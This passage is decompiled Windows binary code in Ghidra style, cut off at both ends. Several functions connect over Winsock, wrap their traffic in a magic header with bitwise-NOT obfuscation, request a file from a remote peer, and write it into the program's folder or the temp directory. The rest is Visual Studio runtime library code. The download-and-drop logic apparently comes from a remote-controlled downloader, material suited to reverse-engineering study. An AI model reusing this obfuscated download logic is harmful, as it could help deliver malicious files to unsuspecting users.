            }
            local_c10 = local_c10 + 0x118;
            uVar1 = local_c10 & 0xffff;
            _Dst = local_c18;
          } while ((int)(uVar1 + 0x118) <= (int)sVar5);
        }
      }
    }
  }
  if (_Dst != (void *)0x0) {
    _free(_Dst);
  }
LAB_00404cec:
  if (local_c14 != 0) {
    Ordinal_3(local_c14);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404d20(undefined4 param_1,undefined2 *param_2)

{
  undefined2 uVar1;
  int iVar2;
  undefined2 *puVar3;
  int *unaff_ESI;
  undefined4 uStack_9c0;
  undefined4 uStack_9bc;
  undefined4 local_9b4 [5];
  undefined local_9a0 [400];
  undefined2 local_810 [1020];
  uint uStack_18;
  uint uStack_14;
  uint local_c;
  
  local_c = DAT_00416048 ^ (uint)local_9b4;
  puVar3 = local_810;
  if (param_2 != (undefined2 *)0x0) {
    puVar3 = param_2;
  }
  *puVar3 = 0;
  uStack_9bc = local_9a0;
  uStack_9c0 = 0x101;
  local_9b4[0] = 0;
  iVar2 = Ordinal_115();
  if (iVar2 != 0) {
LAB_00404d6a:
    uStack_9c0 = 0x404d7b;
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_9bc);
    return;
  }
  iVar2 = Ordinal_23(2,1);
  *unaff_ESI = iVar2;
  if (iVar2 == -1) goto LAB_00404d6a;
  iVar2 = Ordinal_52();
  if (iVar2 == 0) {
    Ordinal_11();
    iVar2 = Ordinal_51(&stack0xfffff63c,4,2);
    if (iVar2 == 0) goto LAB_00404e0d;
  }
  uStack_9bc = (undefined *)CONCAT22(uStack_9bc._2_2_,2);
  uVar1 = Ordinal_9(param_1);
  uStack_9c0 = CONCAT22(uVar1,(undefined2)uStack_9c0);
  iVar2 = Ordinal_4(*unaff_ESI,&uStack_9c0,0x10);
  if (iVar2 == 0) {
    ___security_check_cookie_4(uStack_18 ^ (uint)&uStack_9c0);
    return;
  }
LAB_00404e0d:
  if (*unaff_ESI != 0) {
    Ordinal_3(*unaff_ESI);
    *unaff_ESI = 0;
  }
  ___security_check_cookie_4(uStack_18 ^ (uint)&uStack_9c0);
  return;
}



void __fastcall
FUN_00404e40(undefined4 param_1,int *param_2,undefined2 param_3,undefined2 *param_4,size_t param_5,
            undefined2 *param_6)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  undefined2 local_808 [1024];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  puVar1 = local_808;
  if (param_6 != (undefined2 *)0x0) {
    puVar1 = param_6;
  }
  *puVar1 = 0;
  puVar1 = param_4;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_5) {
      param_5 = 0xfffa;
    }
    puVar1 = (undefined2 *)operator_new(0x1000);
    _Size = param_5;
    if (0xffa < (int)param_5) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_5;
    if ((param_4 == (undefined2 *)0x0) && (param_5 == 0)) {
      FUN_00404fa0(param_2,puVar1);
    }
    else {
      FID_conflict__memcpy(puVar1 + 3,param_4,_Size);
      iVar2 = FUN_00404fa0(param_2,puVar1);
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_5; _Size = _Size + _Size_00) {
          _Size_00 = param_5 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          FID_conflict__memcpy(puVar1,(void *)((int)param_4 + _Size),_Size_00);
          iVar2 = FUN_00404fa0(param_2,puVar1);
          if (iVar2 == 0) break;
        }
      }
    }
  }
  if (puVar1 != (undefined2 *)0x0) {
    FUN_00406c67(puVar1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00404fa0(int *param_1,void *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  size_t unaff_EDI;
  undefined4 local_8;
  
  iVar2 = 0;
  local_8 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)operator_new(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
    *(undefined4 *)((int)piVar3 + 2) = DAT_00416f14;
    *(undefined *)((int)piVar3 + 6) = DAT_00416f18;
    FID_conflict__memcpy((void *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_8 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    FUN_00406c67(param_1);
  }
  return local_8;
}



void __fastcall
FUN_00405040(void *param_1,size_t *param_2,int *param_3,undefined2 *param_4,undefined2 *param_5)

{
  size_t sVar1;
  size_t sVar2;
  size_t sVar3;
  size_t _Size;
  undefined2 *_Src;
  int iVar4;
  int iVar5;
  size_t _Size_00;
  size_t sVar6;
  undefined2 *local_81c;
  size_t local_80c;
  undefined2 local_808;
  undefined local_806 [2046];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_808 = 0;
  _memset(local_806,0,0x7fe);
  local_81c = &local_808;
  if (param_5 != (undefined2 *)0x0) {
    local_81c = param_5;
  }
  *local_81c = 0;
  if ((*param_3 != 0) && (param_1 != (void *)0x0)) {
    local_80c = 0x1000;
    _Src = (undefined2 *)operator_new(0x1000);
    iVar4 = FUN_00405250(_Src,param_3,&local_80c,local_81c);
    sVar6 = local_80c;
    if ((iVar4 != 0) && (_Size_00 = local_80c - 6, -1 < (int)_Size_00)) {
      *param_4 = *_Src;
      iVar4 = *(int *)(_Src + 1);
      sVar6 = *param_2;
      if ((int)sVar6 < (int)_Size_00) {
        sVar3 = 0;
        if (0 < (int)sVar6) {
          FID_conflict__memcpy(param_1,_Src + 3,sVar6);
          sVar3 = *param_2;
        }
      }
      else {
        FID_conflict__memcpy(param_1,_Src + 3,_Size_00);
        sVar3 = _Size_00;
      }
      while ((int)_Size_00 < iVar4) {
        local_80c = 0x1000;
        iVar5 = FUN_00405250(_Src,param_3,&local_80c,local_81c);
        _Size = local_80c;
        sVar6 = local_80c;
        if ((iVar5 == 0) || (sVar6 = _Size_00 + local_80c, 0x10000 < (int)sVar6)) goto LAB_0040522a;
        sVar2 = *param_2;
        sVar1 = sVar3 + local_80c;
        local_80c = sVar6;
        if ((int)sVar2 < (int)sVar1) {
          _Size_00 = sVar6;
          if ((int)sVar3 < (int)sVar2) {
            FID_conflict__memcpy((void *)((int)param_1 + sVar3),_Src,sVar2 - sVar3);
            sVar3 = *param_2;
            _Size_00 = local_80c;
          }
        }
        else {
          FID_conflict__memcpy((void *)((int)param_1 + sVar3),_Src,_Size);
          _Size_00 = local_80c;
          sVar3 = sVar1;
        }
      }
      *param_2 = sVar3;
      sVar6 = local_80c;
    }
LAB_0040522a:
    local_80c = sVar6;
    if (_Src != (undefined2 *)0x0) {
      FUN_00406c67(_Src);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00405250(void *param_1,int *param_2,size_t *param_3,undefined2 *param_4)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  byte *pbVar4;
  undefined2 *puVar5;
  size_t _Size;
  uint uVar6;
  size_t sVar7;
  undefined2 local_8d0 [1024];
  undefined2 local_d0;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  puVar5 = local_8d0;
  if (param_4 != (undefined2 *)0x0) {
    puVar5 = param_4;
  }
  *puVar5 = 0;
  iVar1 = *param_2;
  if ((iVar1 != 0) && (param_1 != (void *)0x0)) {
    local_d0 = local_d0 & 0xff00;
    _memset((void *)((int)&local_d0 + 1),0,199);
    iVar1 = Ordinal_16(iVar1,&local_d0,2,0);
    if ((iVar1 != -1) && (iVar1 != 0)) {
      uVar6 = (uint)local_d0;
      iVar1 = 0;
      piVar2 = (int *)operator_new(uVar6 + 2);
      if (uVar6 != 0) {
        do {
          iVar3 = Ordinal_16(*param_2,iVar1 + (int)piVar2,uVar6 - iVar1,0);
          if ((iVar3 == -1) || (iVar3 == 0)) {
            Ordinal_111();
            goto LAB_004053b1;
          }
          iVar1 = iVar1 + iVar3;
        } while (iVar1 < (int)uVar6);
        if (((4 < iVar1) && (_Size = iVar1 - 5, DAT_00416f14 == *piVar2)) &&
           (*(char *)(piVar2 + 1) == DAT_00416f18)) {
          if (0 < (int)_Size) {
            pbVar4 = (byte *)((int)piVar2 + 5);
            sVar7 = _Size;
            do {
              *pbVar4 = ~*pbVar4;
              pbVar4 = pbVar4 + 1;
              sVar7 = sVar7 - 1;
            } while (sVar7 != 0);
          }
          if ((int)*param_3 < (int)_Size) {
            FID_conflict__memcpy(param_1,(void *)((int)piVar2 + 5),*param_3);
          }
          else {
            FID_conflict__memcpy(param_1,(void *)((int)piVar2 + 5),_Size);
            *param_3 = _Size;
          }
        }
      }
LAB_004053b1:
      if (piVar2 != (int *)0x0) {
        FUN_00406c67(piVar2);
      }
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __thiscall FUN_004053f0(void *this,undefined4 param_1,undefined4 param_2,int param_3)

{
  short sVar1;
  short *psVar2;
  char *_Dst;
  wchar_t *pwVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 local_1028;
  size_t local_1024;
  int local_1020;
  FILE *local_101c;
  undefined2 local_1018;
  undefined local_1016 [2046];
  wchar_t local_818;
  undefined4 local_816 [255];
  WCHAR local_418 [260];
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  _memset(&local_818,0,0x400);
  _wcscpy_s(&local_818,0x1ff,(wchar_t *)this);
  psVar2 = (short *)this;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  puVar6 = &DAT_00418a80;
  puVar7 = (undefined4 *)((int)local_816 + ((int)psVar2 - ((int)this + 2) >> 1) * 2);
  for (iVar5 = 0x80; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  iVar5 = (int)this + 2;
  do {
                    // WARNING: Load size is inaccurate
    sVar1 = *this;
    this = (void *)((int)this + 2);
  } while (sVar1 != 0);
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_1024 = 0x10000;
  local_1018 = 0;
  _memset(local_1016,0,0x7fe);
  local_1020 = 0;
  local_101c = (FILE *)0x0;
  local_1028 = 0;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (param_3 == 0) {
    GetModuleFileNameW((HMODULE)0x0,local_418,0x104);
    pwVar3 = _wcsrchr(local_418,L'\\');
    *pwVar3 = L'\0';
    _wcscpy_s(&local_210,0x104,local_418);
    _wcscat_s(&local_210,0x103,(wchar_t *)&DAT_004143c0);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  iVar4 = FUN_00404d20(param_2,&local_1018);
  if (iVar4 != 0) {
    iVar5 = FUN_00404e40(&local_818,&local_1020,0xbba,&local_818,
                         ((int)this - iVar5 >> 1) * 2 + 0x202,&local_1018);
    if (iVar5 != 0) {
      iVar5 = FUN_00405040(_Dst,&local_1024,&local_1020,(undefined2 *)&local_1028,&local_1018);
      if ((((iVar5 != 0) && ((short)local_1028 == 0xbba)) && (local_1024 != 0)) && (*_Dst == '\0'))
      {
        _wcscat_s(&local_210,0x104,&DAT_00418c80);
        local_101c = (FILE *)0x0;
        __wfopen_s(&local_101c,&local_210,(wchar_t *)&DAT_004143c4);
        if (local_101c != (FILE *)0x0) {
          FUN_004056a0(&local_101c);
        }
        local_101c = (FILE *)0x1;
      }
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  if (local_1020 != 0) {
    Ordinal_3(local_1020);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_004056a0(FILE **param_1)

{
  int iVar1;
  size_t _Count;
  uint uVar2;
  undefined4 *unaff_EDI;
  uint local_100c;
  undefined local_1008 [4096];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  uVar2 = 0;
  iVar1 = Ordinal_16(*unaff_EDI,&local_100c,4,0);
  if (iVar1 != 4) {
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  if (local_100c != 0) {
    do {
      _Count = Ordinal_16(*unaff_EDI,local_1008,0x1000,0);
      if (_Count == 0) break;
      _fwrite(local_1008,1,_Count,*param_1);
      uVar2 = uVar2 + _Count;
    } while (uVar2 < local_100c);
  }
  _fclose(*param_1);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00405770(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x14,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00405790(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_004057b0(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00416048) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)pwVar3 - (int)_Src;
        do {
          wVar1 = *_Src;
          *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eStack_10 = 0x22;
        *piVar2 = 0x22;
        goto LAB_004057f6;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_004057f6:
  FUN_004071df();
  return eStack_10;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    if (_Src != (wchar_t *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        wVar1 = *_Src;
        *(wchar_t *)(iVar3 + (int)_Src) = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040586b;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040586b:
  FUN_004071df();
  return eStack_10;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar3;
  }
  if (-1 < iVar3) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar2 = __flsbuf(0,&local_24);
      if (iVar2 == -1) goto LAB_00405990;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar3;
    }
    iVar2 = __flsbuf(0,&local_24);
    if (iVar2 != -1) {
      return iVar3;
    }
  }
LAB_00405990:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return -1;
  }
  if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vswprintf_helper(__woutput_s_l,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList)
    ;
    if (iVar2 < 0) {
      *_DstBuf = L'\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_004071df();
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00414ba0;
  uStack_c = 0x405a47;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00405aef();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00416048,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00405aef(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    FUN_004071df();
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2010 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_00405bb3:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) != 0) break;
LAB_00405c29:
            if (uVar7 < local_10) {
              iVar5 = __filbuf(_File);
              if (iVar5 == -1) goto LAB_00405ce8;
              if (uVar1 == 0) goto LAB_00405cbe;
              *puVar2 = (char)iVar5;
              local_10 = _File->_bufsiz;
              uVar7 = uVar7 - 1;
              uVar1 = uVar1 - 1;
              puVar2 = puVar2 + 1;
            }
            else {
              if (local_10 == 0) {
                uVar4 = 0x7fffffff;
                if (uVar7 < 0x80000000) {
                  uVar4 = uVar7;
                }
              }
              else {
                if (uVar7 < 0x80000000) {
                  uVar6 = uVar7 % local_10;
                  uVar4 = uVar7;
                }
                else {
                  uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                  uVar4 = 0x7fffffff;
                }
                uVar4 = uVar4 - uVar6;
              }
              if (uVar1 < uVar4) goto LAB_00405cbe;
              _DstBuf_00 = puVar2;
              iVar5 = __fileno(_File);
              iVar5 = __read(iVar5,_DstBuf_00,uVar4);
              if (iVar5 == 0) {
                _File->_flag = _File->_flag | 0x10;
                goto LAB_00405ce8;
              }
              if (iVar5 == -1) goto LAB_00405ce4;
              uVar7 = uVar7 - iVar5;
              uVar1 = uVar1 - iVar5;
              puVar2 = puVar2 + iVar5;
            }
          }
          uVar4 = _File->_cnt;
          if (uVar4 == 0) goto LAB_00405c29;
          if ((int)uVar4 < 0) {
LAB_00405ce4:
            _File->_flag = _File->_flag | 0x20;
LAB_00405ce8:
            return (uVar8 - uVar7) / _ElementSize;
          }
          uVar6 = uVar7;
          if (uVar4 <= uVar7) {
            uVar6 = uVar4;
          }
          if (uVar1 < uVar6) {
LAB_00405cbe:
            if (_DstSize != 0xffffffff) {
              _memset(_DstBuf,0,_DstSize);
            }
            piVar3 = __errno();
            *piVar3 = 0x22;
            goto LAB_00405b73;
          }
          _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
          _File->_cnt = _File->_cnt - uVar6;
          _File->_ptr = _File->_ptr + uVar6;
          uVar7 = uVar7 - uVar6;
          uVar1 = uVar1 - uVar6;
          puVar2 = puVar2 + uVar6;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_00405bb3;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_00405b73:
    FUN_004071df();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_00405d80();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
  }
  return 0;
}



void FUN_00405d80(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2010 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00405e80();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_00405e80(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_00405fca;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          FID_conflict__memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_00405f86:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_00405fca;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_00405f86;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_00405fca:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
